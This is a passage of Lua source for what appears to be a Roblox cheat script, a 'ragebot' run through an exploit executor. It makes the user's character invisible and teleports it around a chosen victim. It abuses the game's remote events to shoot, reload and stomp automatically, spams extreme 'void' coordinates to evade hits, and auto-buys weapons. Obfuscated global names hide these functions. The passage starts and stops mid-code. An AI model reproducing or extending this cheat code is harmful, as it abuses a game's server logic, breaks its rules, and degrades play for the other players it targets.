    if now - art_data.last_refresh >= (getgenv().ArtRefreshTime or 3) then
        art_data.position_log = {}
        art_data.found_pattern = nil
        art_data.last_refresh = now
    end
    local forgiveness = getgenv().ArtForgiveness or 14.4
    local minMatches = getgenv().ArtMinMatches or 4
    local distPenaltyMult = getgenv().ArtDistPenalty or 2
    local distFromCenter = math.abs(targetPos.X) + math.abs(targetPos.Z)
    local isOutOfVoid = distFromCenter < 5700
    if isOutOfVoid then
        forgiveness = forgiveness + (getgenv().ArtOutOfVoidBonus or 5)
    end
    local myChar = lp.Character
    if myChar and myChar:FindFirstChild('HumanoidRootPart') then
        local dist = (targetPos - myChar.HumanoidRootPart.Position).Magnitude
        local penalty = (dist / 100) * distPenaltyMult 
        forgiveness = math.clamp(forgiveness - penalty, 1, 100)
    end
    table.insert(art_data.position_log, {pos = targetPos, time = now})
    local maxLogs = getgenv().ArtLogLimit or 500
    if #art_data.position_log > maxLogs then
        table.remove(art_data.position_log, 1)
    end
    local logs = art_data.position_log
    if #logs < 10 then return targetPos end
    local matches = {}
    for i = 1, #logs do
        local p1 = logs[i].pos
        local count = 0
        local sum = Vector3.new(0, 0, 0)
        for j = 1, #logs do
            local p2 = logs[j].pos
            if (p1 - p2).Magnitude <= forgiveness then
                count = count + 1
                sum = sum + p2
            end
        end
        if count >= minMatches then
            table.insert(matches, {
                pos = sum / count, 
                count = count
            })
        end
    end
    local best = nil
    for _, m in ipairs(matches) do
        if not best or m.count > best.count then
            best = m
        end
    end
    if best then
        art_data.found_pattern = best.pos
        return best.pos
    end
    return targetPos
end)
local GetArtificialPosition = LPH_JIT_MAX(function(plr)
    if not plr or not plr.Character then return nil end
    local root = plr.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    return resolveArtificalPosition(root, root.Position)
end)
local function checkAndBuyMissingTools()
    if not (flags and flags["auto_sentry"]) then return end
    if _G.Multi_IsBuying then return end
    local selectedGuns = flags["gunsmulti"]
    if not selectedGuns or type(selectedGuns) ~= "table" then return end
    local bp = player:FindFirstChild("Backpack")
    local char = player.Character
    if not bp or not char then return end
    local bodyEffects = char:FindFirstChild("BodyEffects")
    if bodyEffects then
        local fullyLoaded = bodyEffects:FindFirstChild("FULLY_LOADED_CHAR")
        if fullyLoaded and not fullyLoaded.Value then
            return
        end
    end
    local missingGuns = {}
    for _, gunName in ipairs(selectedGuns) do
        local cleanName = gunName:gsub(" %- %$%d+", "")
        if not (bp:FindFirstChild(cleanName) or char:FindFirstChild(cleanName)) then
            table.insert(missingGuns, cleanName)
        end
    end
    if #missingGuns > 0 then
        _G.Multi_IsBuying = true
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = bp
            end
        end
        task.wait(0.1)
        local root = char:FindFirstChild("HumanoidRootPart") or _G.GetCharacterRoot()
        local oldPos = root and root.CFrame
        for _, gunName in ipairs(missingGuns) do
            _G.CurrentBuyingItem = _G.Ammomapragebot[gunName] or gunName
            _G.BuyItem(gunName)
            task.wait(0.06)
        end
        task.wait(0.5)
        if (_G.Multi_SpareAmmo or 0) > 0 then
            _G.BuyAmmoForWeapons(missingGuns, _G.Multi_SpareAmmo or 0)
            task.wait(0.5)
        end
        if root and oldPos then 
            root.CFrame = oldPos 
        end
        task.wait(0.3)
        reupdallowedtools()
        equipallowedmultitools()
        _G.CurrentBuyingItem = nil
        _G.Multi_IsBuying = false
    end
end
_G.PlayedKnockSoundFor = _G.PlayedKnockSoundFor or {}
_G.PlayedKnockEffectFor = _G.PlayedKnockEffectFor or {}
_G.PlayedKnockNotificationFor = _G.PlayedKnockNotificationFor or {}
_G.v88cksnwq = _G.v88cksnwq or {}
if _G.RageHeartbeat then _G.RageHeartbeat:Disconnect() end
_G.RageHeartbeat = game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function(delta)
    local success, err = pcall(function()
        if not nymus.Target.AutoKill then 
            return 
        end
        local lp = game:GetService("Players").LocalPlayer
        local char = lp.Character
        if not char or not char.Parent then 
            return 
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 or hrp.Position.Y < -1000 then
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            return 
        end
        if _G.Multi_IsBuying or _G.IsBuying or _G.busdhfnjsy7gjsy7d then
            resetVelocity()
            return 
        end
        local myBe = char:FindFirstChild("BodyEffects")
        local isMeKnocked = myBe and (myBe:FindFirstChild("K.O") or myBe:FindFirstChild("KO")) and (myBe:FindFirstChild("K.O") or myBe:FindFirstChild("KO")).Value
        if isMeKnocked then 
            nymus.Target.AutoKill = false
            if flags then flags["auto_sentry"] = false end
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            return 
        end
        local TargetPlr = game:GetService("Players"):FindFirstChild(nymus.Target.Target or "")
        if not TargetPlr or not TargetPlr.Character or not TargetPlr.Character:FindFirstChild("HumanoidRootPart") then
            targetStartTime = 0
            voidSmartTimer = 0
            voidSmartState = "waiting"
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            return 
        end
        local TChar = TargetPlr.Character
        local TBe = TChar:FindFirstChild("BodyEffects")
        local TKo = TBe and (TBe:FindFirstChild("K.O") or TBe:FindFirstChild("KO"))
        local TSDeath = TBe and TBe:FindFirstChild("SDeath")
        local Knocked = TKo and TKo.Value
        local Dead = TSDeath and TSDeath.Value
        local hasFF = TChar:FindFirstChild("ForceField")
        local meleeNames = {"[Knife]", "[Shovel]", "[Bat]"}
        if not Knocked and not Dead then
            _G.PlayedKnockSoundFor[TargetPlr.Name] = nil
            _G.PlayedKnockEffectFor[TargetPlr.Name] = nil
            _G.PlayedKnockNotificationFor[TargetPlr.Name] = nil
            _G.v88cksnwq[TargetPlr.Name] = nil
        end
        if nymus.Target.AutoKill and nymus.Target.Target and not Knocked and not Dead then
            local targetHRP = TChar:FindFirstChild("HumanoidRootPart")
            if targetHRP and (getgenv().connectionresolvderfgdg or _G.flamethrower_hack or getgenv().beanbag_method) then
                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", targetHRP) end)
            else
                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
            end
        else
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
        end
        if nymus.Target.AutoKill and nymus.Target.Target then
            local targetHRP = TChar:FindFirstChild("HumanoidRootPart")
            local targetHead = TChar:FindFirstChild("Head")
            local targetHum = TChar:FindFirstChildOfClass("Humanoid")
            if not (targetHRP and targetHum) then return end
            if Dead then
                targetStartTime = 0
                voidSmartTimer = 0
                voidSmartState = "waiting"
                _G.HitPredictRunning = false
                hrp.CFrame = CFrame.new(math.random(-1766000, 1766000), 200000, math.random(-1766000, 1766000))
                if _G.flamethrower_hack then
                    local ft = char:FindFirstChild("[Flamethrower]")
                    if ft then ft:Deactivate() end
                end
                if flags.glueresolver then
                    for _, name in ipairs(meleeNames) do
                        local toolInBg = lp.Backpack:FindFirstChild(name)
                        if toolInBg then hum:EquipTool(toolInBg) break end
                    end
                end
                return
            end
            local isCurrentlyVoiding = false
            if nymus.Sentry.SafeMode and hum and hum.Health / hum.MaxHealth <= 0.2 then
                if not nymus.Sentry.LastPos then nymus.Sentry.LastPos = hrp.CFrame end
                hrp.CFrame = CFrame.new(-2343245, -433224, -457732)
                isCurrentlyVoiding = true
            elseif nymus.Sentry.LastPos then
                hrp.CFrame = nymus.Sentry.LastPos
                nymus.Sentry.LastPos = nil
            end
            local tool = char:FindFirstChildOfClass("Tool")
            if not Knocked then
                _G.HitPredictRunning = false
                local targetPos = targetHRP.Position
                if flags.sdgmuje4rmutirjmtg then
                    targetPos = GetArtificialPosition(TargetPlr)
                elseif getgenv().FakePosResolverEnabled and getgenv().ResolvedPosition then
                    targetPos = getgenv().ResolvedPosition
                elseif backtrackResolverEnabled then
                    targetPos = GetBacktrackPosition(TargetPlr)
                elseif nymus.Target.PredictionEnabled then
                    targetPos = targetPos + targetHRP.Velocity * nymus.Target.PredictionAmount
                else
                    targetPos = (targetHead and targetHead.Position) or targetPos
                end
                if hasFF or (not ismultion and not tool and not _G.flamethrower_hack) or (ismultion and #equippedmulti == 0 and not _G.flamethrower_hack) then
                    hrp.CFrame = CFrame.new(math.random(-1766000, 1766000), math.random(170000, 233000), math.random(-1766000, 1766000))
                    if tool then MainEvent:FireServer("Reload", tool) end
                elseif _G.flamethrower_hack then
                    local flameTool = char:FindFirstChild("[Flamethrower]") or lp.Backpack:FindFirstChild("[Flamethrower]")
                    if flameTool then
                        if flameTool.Parent ~= char then hum:EquipTool(flameTool) end
                        hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
                        local handle = flameTool:FindFirstChild("Handle")
                        if handle and targetHead then
                            handle.CFrame = targetHead.CFrame * CFrame.new(0, (_G.flameOrbitHeight or 2), 0) * CFrame.Angles(math.rad(-90), 0, 0)
                        end
                        flameTool:Activate()
                    end
                elseif getgenv().connectionresolvderfgdg then
                    hrp.CFrame = TChar:GetPivot() * CFrame.new(0, 1.8, 2.4)
                    if ismultion then
                        for _, t in ipairs(equippedmulti) do if t.Parent == char then t:Activate() end end
                    elseif tool and tool:IsDescendantOf(char) and tool:FindFirstChild("Handle") then
                        tool:Activate()
                    end
                elseif getgenv().beanbag_method then
                    local bag = char:FindFirstChild("[BeanBag]") or lp.Backpack:FindFirstChild("[BeanBag]")
                    if bag then
                        if bag.Parent ~= char then hum:EquipTool(bag) end
                        hrp.CFrame = TChar:GetPivot() * CFrame.new(0, 1.8, 2.4)
                        local handle = bag:FindFirstChild("Handle")
                        if handle and targetHRP then
                            handle.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 0)
                        end
                        bag:Activate()
                    end
                elseif not getgenv().GlueResolverEnabled then
                    local shouldVoidSpam = false
                    local autoSmartEnabled = flags and flags["ragebottemplehookunnamedenhancementsjujuascendifysample"]
                    
if getgenv().ragevoidspm then
    if autoSmartEnabled then
        if targetStartTime == 0 then
            targetStartTime = tick()
            voidSmartTimer = 0
            voidSmartState = "waiting"
            lastTargetHealth = targetHum and targetHum.Health or 100
        end
        local currentHealth = targetHum and targetHum.Health or 100
        local healthDecreased = currentHealth < lastTargetHealth
        lastTargetHealth = currentHealth
        local waitSeconds = flags and flags["smart_wait_seconds"] or 8
        local voidSeconds = flags and flags["smart_void_seconds"] or 5
        if voidSmartState == "waiting" then
            voidSmartTimer = voidSmartTimer + delta
            if voidSmartTimer >= waitSeconds then
                if not healthDecreased and currentHealth > 0 then
                    voidSmartState = "voiding"
                    voidSmartTimer = 0
                else
                    voidSmartTimer = 0
                end
            end
            shouldVoidSpam = false
        elseif voidSmartState == "voiding" then
            voidSmartTimer = voidSmartTimer + delta
            shouldVoidSpam = true
            if voidSmartTimer >= voidSeconds then
                voidSmartState = "waiting"
                voidSmartTimer = 0
            end
        end
    else
        local method = getgenv().voidpsamragemethodeefwsuhefn
        if method == 'while targeting' or (method == 'while reloading' and tool and tool:FindFirstChild("Ammo") and tool.Ammo.Value <= 0) then
            shouldVoidSpam = true
        end
    end
end           
if shouldVoidSpam then
    voidTimer = voidTimer + delta
    local threshold = isVoidElevated and (getgenv().voidspaminvoidragee or 0.4) or 0.133
    if voidTimer >= threshold then
        voidTimer = 0
        isVoidElevated = not isVoidElevated
    end
else
    isVoidElevated = false
    if not autoSmartEnabled then
        targetStartTime = 0
    end
end
if isVoidElevated then
    _G.patternType = flags["s9dfoajobdhreywewdwedw"]
    _G.vDirection = flags["s9djjj22"] or "+Y"
    _G.switchSpeedVal = flags["dfdgettdttrrrrttt6r"] or 0.01
    _G.depthMult = flags["dfdgettttfvrrrrttt6r"] or 1
    _G.currentTime = tick()
    _G.lastPatternSwitch = _G.lastPatternSwitch or 0

    if _G.currentTime - _G.lastPatternSwitch >= _G.switchSpeedVal then
        _G.lastPatternSwitch = _G.currentTime
        
        if _G.patternType == 'NaN point' then
            local breakValue = 1e16 * _G.depthMult
            local farCoords = {1E8, 5E7, 25E6, 1E7, 1E7, 2.5E7, 5E7, 1E8}
            local rF1 = (farCoords[math.random(1, #farCoords)] + math.random(1E4, 1E4)) * _G.depthMult
            local rF2 = (farCoords[math.random(1, #farCoords)] + math.random(1E4, 1E4)) * _G.depthMult
            local chance = math.random(1, 23)
            if chance > 20 then
                local special = {0, 7.5E7 * _G.depthMult, -7.5E7 * _G.depthMult}
                local pick = special[math.random(1, #special)]
                if _G.vDirection == '+Y' then _G.voidPos = Vector3.new(pick, breakValue, pick)
                elseif _G.vDirection == '+X' then _G.voidPos = Vector3.new(breakValue, pick, pick)
                elseif _G.vDirection == '+Z' then _G.voidPos = Vector3.new(pick, pick, breakValue)
                end
            else
                if _G.vDirection == '+Y' then _G.voidPos = Vector3.new(rF1, breakValue, rF2)
                elseif _G.vDirection == '+X' then _G.voidPos = Vector3.new(breakValue, rF1, rF2)
                elseif _G.vDirection == '+Z' then _G.voidPos = Vector3.new(rF1, rF2, breakValue)
                end
            end
        elseif _G.patternType == 'deep void' then
            local deepV = {2E6, 5E6, 1E7, 2E7, 5E7}
            local farC = {1E5, 25E4, 5E5, 1E6, 2E6}
            local rD = deepV[math.random(1, #deepV)] * _G.depthMult
            local r1 = (farC[math.random(1, #farC)] + math.random(1E4, 2E4)) * _G.depthMult
            local r2 = (farC[math.random(1, #farC)] + math.random(1E4, 2E4)) * _G.depthMult
            if _G.vDirection == '+Y' then _G.voidPos = Vector3.new(r1, rD, r2)
            elseif _G.vDirection == '+X' then _G.voidPos = Vector3.new(rD, r1, r2)
            elseif _G.vDirection == '+Z' then _G.voidPos = Vector3.new(r1, r2, rD)
            end
        else
            local rD = math.random(150000, 250000) * _G.depthMult
            local rO1 = math.random(1000, 5000) * _G.depthMult
            local rO2 = math.random(1000, 5000) * _G.depthMult
            if _G.vDirection == '+Y' then _G.voidPos = Vector3.new(rO1, rD, rO2)
            elseif _G.vDirection == '+X' then _G.voidPos = Vector3.new(rD, rO1, rO2)
            elseif _G.vDirection == '+Z' then _G.voidPos = Vector3.new(rO1, rO2, rD)
            end
        end
    end
    hrp.CFrame = CFrame.new(_G.voidPos or hrp.Position)
    isCurrentlyVoiding = true
                    else
                        local offset = aggressiveStrafe and Vector3.new(math.random(-62, 63), math.random(-27, 25), math.random(-52, 60)) or Vector3.new(math.random(-strafeOffset, strafeOffset), math.random(-strafeOffset, strafeOffset), math.random(-strafeOffset, strafeOffset))
                        hrp.CFrame = CFrame.lookAt(targetPos + offset, targetPos)
                    end
                end
                if not hasFF and not isCurrentlyVoiding and not _G.flamethrower_hack then
                    MainEvent:FireServer("UpdateMousePosI2", targetPos)
                    local gunList = ismultion and equippedmulti or {tool}
                    for _, t in ipairs(gunList) do
                        if t and t:IsA("Tool") and t.Parent == char then
                            local mainAmmo = t:FindFirstChild("Ammo")
                            if (t.Name == "[Flintlock]" and mainAmmo and mainAmmo.Value == 0) or (mainAmmo and mainAmmo.Value <= 0) then
                                MainEvent:FireServer("Reload", t)
                            else
                                if t:FindFirstChild("Handle") then
                                    MainEvent:FireServer("ShootGun", t.Handle, t.Handle.Position, targetPos, targetHead, Vector3.new(0,1,0))
                                    if _G.sdjihfibnsnbvbdffhbjn.Enabled then
                                        _G.fghjsdfgksdfjgkldfs(t.Handle.Position, targetPos)
                                    end
                                    if mainAmmo and mainAmmo.Value > 0 and mainAmmo.Value <= 3 then
                                        task.spawn(function()
                                            task.wait(0.1)
                                            MainEvent:FireServer("Reload", t)
                                        end)
                                    end
                                elseif t:IsDescendantOf(char) then
                                    t:Activate()
                                    if mainAmmo and mainAmmo.Value > 0 and mainAmmo.Value <= 3 then
                                        task.spawn(function()
                                            task.wait(0.1)
                                            MainEvent:FireServer("Reload", t)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end
if Knocked and not Dead then
                if _G.flamethrower_hack then
                    local ft = char:FindFirstChild("[Flamethrower]")
                    if ft then ft.Parent = lp.Backpack end
                end
                if flags.glueresolver then
                    for _, name in ipairs(meleeNames) do
                        local m = char:FindFirstChild(name)
                        if m and m:IsA("Tool") then m.Parent = lp.Backpack end
                    end
                end
                local torso = TChar:FindFirstChild("UpperTorso") or TChar:FindFirstChild("Torso")
                if torso then
                    local stompOffset = Vector3.new(0, flags["edrfghhdetdffvvvvvvc"] or 3, 0)
                    local predictedPos = torso.Position + (torso.Velocity * delta)
                    
                    hrp.CFrame = CFrame.new(predictedPos + stompOffset)
                    hrp.Velocity = Vector3.zero
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    MainEvent:FireServer("Stomp")
                    task.wait(0.02)
                    MainEvent:FireServer("Stomp")
                    if flags.glueresolver and getgenv().hitpedictglueee and not _G.HitPredictRunning then
                        _G.HitPredictRunning = true
                        task.spawn(function()
                            task.wait(13.3)
                            while nymus.Target.Target == TargetPlr.Name and Knocked and not Dead and not hasFF and flags.glueresolver do
                                local toolToUse = nil
                                for _, name in ipairs(meleeNames) do
                                    local b = lp.Backpack:FindFirstChild(name)
                                    if b then toolToUse = b break end
                                end
                                if toolToUse and toolToUse.Parent == lp.Backpack then
                                    hum:EquipTool(toolToUse)
                                    local sT = tick()
                                    repeat task.wait() until toolToUse.Parent == char or tick() - sT > 1
                                    if toolToUse.Parent == char then toolToUse:Activate() end
                                end
                                task.wait(7)
                            end
                            _G.HitPredictRunning = false
                        end)
                    end
                    if not _G.PlayedKnockSoundFor[TargetPlr.Name] then
                        _G.PlayedKnockSoundFor[TargetPlr.Name] = true
                    end
                    if _G.f28skdn and not _G.v88cksnwq[TargetPlr.Name] then
                        _G.v88cksnwq[TargetPlr.Name] = true
                        _G.u77vmsq(TChar)
                    end
                    if _G.IsEnabledDmg and not _G.PlayedKnockDamageFor[TargetPlr.Name] then
                        _G.PlayedKnockDamageFor[TargetPlr.Name] = true
                        local lastH = _G.PrevHealth[TargetPlr.UserId] or 100
                        _G.DoDmgDisplay(TargetPlr, math.floor(lastH))
                    end
                end
            elseif Dead then
                if not _G.HasReloadedAfterKill then
                    _G.HasReloadedAfterKill = true
                    LPH_NO_VIRTUALIZE(function()
                        if ismultion then
                            for _, t in ipairs(equippedmulti) do
                                if t and t.Parent == char then
                                    MainEvent:FireServer("Reload", t)
                                end
                            end
                        else
                            local currentTool = char:FindFirstChildOfClass("Tool")
                            if currentTool then
                                MainEvent:FireServer("Reload", currentTool)
                            end
                        end
                        task.wait(0.5)
                        _G.HasReloadedAfterKill = nil
                    end)()
                end
            end
        end
    end)
end))
if _G.RageRender2 then _G.RageRender2:Disconnect() end
_G.RageRender2 = game:GetService("RunService").RenderStepped:Connect(LPH_JIT_MAX(function()
    local success, err = pcall(function()
        if _G.Multi_IsBuying or _G.IsBuying or _G.busdhfnjsy7gjsy7d then
            resetVelocity()
            return 
        end
        if not nymus.Target.AutoKill or not nymus.Target.Target then 
            return 
        end
        local Target = game:GetService("Players"):FindFirstChild(nymus.Target.Target)
        if not Target or not Target.Character then return end
        local lp = game.Players.LocalPlayer
        local char = lp.Character
        if not char or not char.Parent then return end
        local lhrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not lhrp or not hum or hum.Health <= 0 then return end
        local be = Target.Character:FindFirstChild("BodyEffects")
        local dead = be and be:FindFirstChild("SDeath") and be.SDeath.Value
        local hasFF = Target.Character:FindFirstChild("ForceField")
        local tool = char:FindFirstChildOfClass("Tool")
        local gunReady = ismultion and (#equippedmulti > 0) or (tool ~= nil)
        if (dead or hasFF or not gunReady) and nymus.Target.AutoKill then
            lhrp.CFrame = CFrame.new(math.random(-1766000, 1766000), math.random(170000, 233000), math.random(-1766000, 1766000))
            if ismultion then
                for _, t in ipairs(equippedmulti) do
                    if t.Parent == char then
                        MainEvent:FireServer("Reload", t)
                    end
                end
            elseif tool and tool.Parent == char then 
                MainEvent:FireServer("Reload", tool) 
            end
        end
    end)
end))
getgenv().ResolvedPosition = nil
game:GetService("ReplicatedStorage").MainEvent.OnClientEvent:Connect(LPH_NO_VIRTUALIZE(function(name, shooter, handle, forced, aimpos, targetpart, _)
    if not getgenv().FakePosResolverEnabled then return end
    local targetName = nymus.Target.Target
    if not targetName then return end
    local targetPlr = game:GetService("Players"):FindFirstChild(targetName)
    if targetPlr and shooter == targetPlr then
        if forced and typeof(forced) == "Vector3" then
            getgenv().ResolvedPosition = forced
            task.delay(1, function()
                if getgenv().ResolvedPosition == forced then
                    getgenv().ResolvedPosition = nil
                end
            end)
        end
    end
end))
task.spawn(function()
    while task.wait(0.5) do
        local targetName = nymus.Target.Target
        if targetName then
            local t = Players:FindFirstChild(targetName)
            if t and t.Character then
                local be = t.Character:FindFirstChild("BodyEffects")
                if be then
                    local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
                    if not (ko and ko.Value) then
                        _G.PlayedKnockSoundFor[targetName] = nil
                        _G.PlayedKnockEffectFor[targetName] = nil
                    end
                end
            else
                _G.PlayedKnockSoundFor[targetName] = nil
                _G.PlayedKnockEffectFor[targetName] = nil
            end
        end
    end
end)
task.spawn(function()
    while task.wait(0.2) do
        local lp = game.Players.LocalPlayer
        local char = lp.Character
        if char and nymus.Target.AutoKill == false and currentTarget and flags and flags["auto_sentry"] == false then
            local myBe = char:FindFirstChild("BodyEffects")
            local isMeKnocked = myBe and (myBe:FindFirstChild("K.O") or myBe:FindFirstChild("KO")) and (myBe:FindFirstChild("K.O") or myBe:FindFirstChild("KO")).Value
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not isMeKnocked and hum and hum.Health > 0 and currentTarget and game.Players:FindFirstChild(currentTarget) then
                local targetPlr = game.Players:FindFirstChild(currentTarget)
                if targetPlr and targetPlr.Character then
                    local targetBe = targetPlr.Character:FindFirstChild("BodyEffects")
                    local targetKo = targetBe and (targetBe:FindFirstChild("K.O") or targetBe:FindFirstChild("KO"))
                    local targetDead = targetBe and targetBe:FindFirstChild("SDeath") and targetBe.SDeath.Value
                    if not (targetKo and targetKo.Value) and not targetDead then
                        flags["auto_sentry"] = true
                        nymus.Target.AutoKill = true
                        _G.StopInvis = false
                        task.spawn(function()
                            while char and char.Parent and nymus.Target.AutoKill and not _G.StopInvis do
                                for _, v in pairs(char:GetDescendants()) do
                                    if v:IsA("BasePart") or v:IsA("Decal") then 
                                        v.LocalTransparencyModifier = 1 
                                    end
                                end
                                game:GetService("RunService").RenderStepped:Wait()
                            end
                        end)
                    end
                end
            end
        end
    end
end)
_G.BlacklistedPlayers = _G.BlacklistedPlayers or {}
local currentTarget = nil
local TargetDropdown = section_target:dropdown({
    name = "ragebot target",
    flag = "target_dropdown",
    items = {"[none]"},
    callback = function(Value)
        getgenv().ResolvedPosition = nil
        if Value and Value ~= "[none]" then
            local name_str = tostring(Value)
            local username = name_str:match("^(.+)%s+%(") or name_str
            currentTarget = username
            if nymus and nymus.Target then
                nymus.Target.Target = username
            end
        else
            currentTarget = nil
            if nymus and nymus.Target then
                nymus.Target.Target = nil
            end
        end
    end
})
task.spawn(function()
    while task.wait(1) do
        local targetList = {"[none]"}
        local targetStillExists = false
        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
            if p ~= game:GetService("Players").LocalPlayer then
                local display = (p.DisplayName and p.DisplayName ~= "") and p.DisplayName or p.Name
                local entryName = p.Name .. " (" .. display .. ")"
                table.insert(targetList, entryName)
                if currentTarget == p.Name then
                    targetStillExists = true
                end
            end
        end
        pcall(function()
            TargetDropdown:list(targetList)
        end)
        if currentTarget then
            if not targetStillExists then
                currentTarget = nil
                getgenv().ResolvedPosition = nil
                if nymus and nymus.Target then
                    nymus.Target.Target = nil
                end
                if flags then 
                    flags["auto_sentry"] = false 
                end
            end
        end
    end
end)
section_strafe:slider({
    name = "strafe random offset",
    flag = "sentry_strafe656",
    default = 25.73971,
    min = 2,
    suffix = "x",
    max = 50,
    interval = 0.001,
    callback = function(v)
        strafeOffset = v
    end
})
section_strafe:slider({
    name = "stomp offset",
    flag = "edrfghhdetdffvvvvvvc",
    default = 4.5,
    min = 0,
    suffix = "x",
    max = 10,
    interval = 0.01,
    callback = function(Value)
        stompOffsetValue = Value
    end
})
section_strafe:slider({
    name = "prediction",
    flag = "aexecpred",
    default = 0.25462,
    suffix = "x",
    min = 0,
    max = 1,
    interval = 0.001,
    callback = function(Value)
        nymus.Target.PredictionAmount = Value
        nymus.Target.PredictionEnabled = (Value > 0)
    end
})
section_target:toggle({
    name = "ragebot",
    flag = "auto_sentry",
    default = false,
    callback = function(state)
        if state then
            if _G.IsRespawning then
                library:notification({ text = "ragebot will reinitialize after spawn" })
                return
            end
            local bp = player:FindFirstChild("Backpack")
            local char = player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local selectedGuns = flags["gunsmulti"] or {}
            local hasAllGuns = true
            local isSpecialMode = flags["fgh845yhdg"]
            if not isSpecialMode then
                if #selectedGuns == 0 then
                    hasAllGuns = false
                else
                    for _, gunName in ipairs(selectedGuns) do
                        local cleanName = gunName:gsub(" %- %$%d+", "")
                        if not (bp:FindFirstChild(cleanName) or char:FindFirstChild(cleanName)) then
                            hasAllGuns = false
                            break
                        end
                    end
                end
            end
            if not hasAllGuns and not isSpecialMode then
                reupdallowedtools()
                checkAndBuyMissingTools()
                equipallowedmultitools()
                tooltrackingmulti()
                multigunbackpackmonitor()
                ismultion = true
                hasAllGuns = true
                for _, gunName in ipairs(selectedGuns) do
                    local cleanName = gunName:gsub(" %- %$%d+", "")
                    if not (bp:FindFirstChild(cleanName) or char:FindFirstChild(cleanName)) then
                        hasAllGuns = false
                        break
                    end
                end
                if not hasAllGuns then
                    nymus.Target.AutoKill = false
                    if flags then flags["auto_sentry"] = false end
                    library:notification({ text = "failed to buy required guns" })
                    return
                end
            end
            if not isSpecialMode and #selectedGuns > 0 then
                reupdallowedtools()
                equipallowedmultitools()
                tooltrackingmulti()
                multigunbackpackmonitor()
                ismultion = true
            end
            if not currentTarget or not game.Players:FindFirstChild(currentTarget) then
                nymus.Target.AutoKill = false
                if flags then flags["auto_sentry"] = false end
                library:notification({ text = "no ragebot target selected" })
                return
            end
            nymus.Target.AutoKill = true
            nymus.Target.Target = currentTarget
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp and hum and hum.Health > 0 and hrp.Position.Y > -1000 and hrp.Position.Y < 5000 then 
                SavedCFrame = hrp.CFrame 
            end
            _G.StopInvis = false
            local function applyInvis(c)
                if not c then return end
                task.spawn(function()
                    while c and c.Parent and nymus.Target.AutoKill and not _G.StopInvis do
                        for _, v in pairs(c:GetDescendants()) do
                            if v:IsA("BasePart") or v:IsA("Decal") then 
                                v.LocalTransparencyModifier = 1 
                            end
                        end
                        game:GetService("RunService").RenderStepped:Wait()
                    end
                end)
            end
            if player.Character then applyInvis(player.Character) end
            library:notification({ text = "ragebot enabled" })
        else
            _G.StopInvis = true
            nymus.Target.AutoKill = false
            _G.HitPredictRunning = false
            ismultion = false
            if toolconadd then toolconadd:Disconnect() end
            if toolconremove then toolconremove:Disconnect() end
            if conbackpackfr then conbackpackfr:Disconnect() end
            local char = player.Character
            local backpack = player:FindFirstChild("Backpack")
            if char and backpack then
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = backpack
                    end
                end
            end
            table.clear(equippedmulti)
            local char = player.Character
            if char then
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("Decal") then 
                        v.LocalTransparencyModifier = 0 
                    end
                end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
                    hrp.Velocity = Vector3.new(0,0,0)
                    hrp.RotVelocity = Vector3.new(0,0,0)
                    if SavedCFrame and typeof(SavedCFrame) == "CFrame" then
                        if not _G.IsRespawning and char.Parent then
                            hrp.CFrame = SavedCFrame
                        end
                        SavedCFrame = nil
                    end
                end
            end
        end
    end
})
_G.vmsivb94j = game:GetService("Players").LocalPlayer
_G.xcmvi84k2 = game:GetService("RunService")
_G.pqiwe02k1 = workspace.CurrentCamera
_G.zxcv92k1s = Drawing.new("Circle")
_G.zxcv92k1s.Visible = false
_G.zxcv92k1s.Transparency = 0.5
_G.zxcv92k1s.Thickness = 2
_G.zxcv92k1s.Filled = true
_G.asdf81l0p = Drawing.new("Circle")
_G.asdf81l0p.Visible = false
_G.asdf81l0p.Transparency = 1
_G.asdf81l0p.Color = Color3.new(0, 0, 0)
_G.asdf81l0p.Thickness = 1
_G.asdf81l0p.Filled = false
_G.qwer73m1n = Drawing.new("Circle")
_G.qwer73m1n.Visible = false
_G.qwer73m1n.Transparency = 1
_G.qwer73m1n.Color = Color3.new(0, 0, 0)
_G.qwer73m1n.Thickness = 1
_G.qwer73m1n.Filled = false
_G.dsgusnrmhgursg = LPH_NO_VIRTUALIZE(function()
    _G.hjkl55v9x = _G.vmsivb94j.Character
    _G.tyui66b8z = _G.hjkl55v9x and _G.hjkl55v9x:FindFirstChild("HumanoidRootPart")
    if _G.tyui66b8z and library.flags["cmdexe"] then
        _G.bnm12c4r, _G.op09x8z7 = _G.pqiwe02k1:WorldToViewportPoint(_G.tyui66b8z.Position)
        if _G.op09x8z7 then
            _G.lkj44h3g = Vector2.new(_G.bnm12c4r.X, _G.bnm12c4r.Y)
            _G.zxcv92k1s.Position = _G.lkj44h3g
            _G.asdf81l0p.Position = _G.lkj44h3g
            _G.qwer73m1n.Position = _G.lkj44h3g
            _G.zxcv92k1s.Visible = true
            _G.asdf81l0p.Visible = true
            _G.qwer73m1n.Visible = true
        else
            _G.zxcv92k1s.Visible = false
            _G.asdf81l0p.Visible = false
            _G.qwer73m1n.Visible = false
